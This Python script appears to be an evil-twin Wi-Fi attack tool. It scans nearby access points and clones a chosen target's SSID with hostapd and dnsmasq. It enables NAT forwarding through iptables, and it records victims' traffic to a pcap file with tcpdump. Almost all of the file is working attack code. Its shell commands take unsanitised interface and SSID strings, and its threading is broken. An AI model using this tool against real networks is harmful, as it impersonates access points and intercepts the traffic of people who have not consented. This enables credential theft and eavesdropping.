#!/usr/bin/env python3
import os
from random import randint
import re
import threading

def get_interfaces():
    
    # Get the list of equipments from /sys/classe/net
    print("\nGetting interfaces list ...\n")   
    availableIfaces = [str(i) for i in os.listdir("/sys/class/net")]

    choices = {}
    listNum = 0
    # Processing the interfaces into a readable dictionnary
    # And print the interfaces to the user
    for i in range(len(availableIfaces)):
        if re.match("wl", availableIfaces[i]):
            print("[%i] : %s" %(listNum, availableIfaces[i]))
            choices[str(listNum)] = str(availableIfaces[i])
            listNum+=1
        else:
            continue

    # Ask user for prefered interface
    if len(choices) != 0:
        userChoice = str(input("\nPlease choose an interface to use : "))
    else:
        print("No available interfaces")
        exit()

    # Check if the choice is good
    while userChoice not in choices:
        print("\nThis is not quite right !")
        userChoice = str(input("\nPlease choose an interface to use : "))

    # Get only the prefered interface to keep track of
    interface = choices[userChoice]
    print("\nYou chose : "+interface)
    return interface

def get_target(interface):
    
    # Scanning with the interface and parsing with AWK
    print("\nGetting nearby AP list ...\n")
    os.system("iw dev "+interface+" scan | awk -f scan.awk > interfaces.tmp")
    
    choices = {}
    number = 0
    # Processing the potential targets into a readable dictionnary
    # And print the potential targets to the user
    with open("interfaces.tmp", "r") as accessPoints:
        for accessPoint in accessPoints:
            print("[%i] :\t%s" %(number, accessPoint.strip("\n")))
            choices[str(number)] = accessPoint.strip("\n")
            number+=1
    
    # Ask user for prefered target
    userChoice = str(input("\nPlease choose the AP you want to target : "))

    # Check if the choice is good
    while userChoice not in choices:
        print("\nThis is not quite right !")
        userChoice = str(input("\nPlease choose the AP you want to target : "))
    
    # Remove temporary file
    os.remove("interfaces.tmp")

    # Processing the target choice into a readable tab
    userChoice = choices[userChoice].replace(" ", "")
    target = userChoice.split(',')
    print("\nYou chose : "+target[0])
    return target

def evil_twix(interface, target):

    # Allow forwarding and put interface in ip tables
    print("\nIp forwarding activation ...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("\nWe will need the interface to use for ip forwarding")
    interface_fwd = get_interfaces()
    os.system("iptables -I POSTROUTING -t nat -o %s -j MASQUERADE" % interface_fwd)
    
    # Copy the templates in the working directory
    print("\n Config file creation ...")
    os.system("cp template/template_dnsmasq.conf dnsmasq.conf")
    os.system("cp template/template_hostapd.conf hostapd.conf")

    # Modifying the templates
    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf" % interface)
    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % interface)
    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf" % target[0])

    os.system("ip addr add 10.0.0.1/24 dev %s" % interface)

    hostapd = threading.Thread(target=os.system("hostapd hostapd.conf"))
    dnsmasq = threading.Thread(target=os.system("dnsmasq -d –C dnsmasq.conf"))
    tcpdump = threading.Thread(target=os.system("tcpdump -s 0 -i %s -w test.pcap" % interface))

    print("\nStarting the attack ...")

    hostapd.start()
    dnsmasq.start()
    tcpdump.start()

if __name__ == "__main__":
    
    # Check for root privileges
    if os.geteuid()!=0:
        print("You need sudo for that")
        exit()

    # Print a banner
    os.system("cat banner/banner_%d.txt" % randint(0, 5))
    interface = get_interfaces()
    target = get_target(interface)
    attacksAvailable = "(E)vil twin"
    attacksAvailable+=" : "
    attack = input("Which attack do you want to perform : " + attacksAvailable)
    if attack == "E" or attack == "e":
        evil_twix(interface, target)
